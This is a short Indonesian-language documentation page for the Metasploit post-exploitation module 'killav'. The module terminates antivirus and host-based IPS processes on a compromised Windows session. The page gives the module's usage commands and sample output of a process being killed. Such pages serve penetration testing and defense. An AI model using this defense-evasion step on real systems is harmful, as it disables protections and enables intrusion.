# killav

Modul ini mencoba menemukan dan menghentikan proses-proses yang diidentifikasi sebagai terkait dengan `Antivirus` atau `Host-based IPS`.

## Penulis
- Marc-Andre Meloche (MadmanTM)
- Nikhil Mittal (Samratashok)
- Jerome Athias
- OJ Reeves

##  Platform
- `Windows`
  
## Cara Penggunaan di Metasploit

```
set SESSION <ID>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Attempting to terminate 'update.exe' (PID: 2284) ...
[+] update.exe (PID: 2284) terminated.
[+] A total of 1 process(es) were discovered, 1 were terminated.
[*] Post module execution completed
msf6 post(windows/manage/killav) > opt
```

## Referensi
- [Rapid7](https://www.rapid7.com/db/modules/post/windows/manage/killav/)
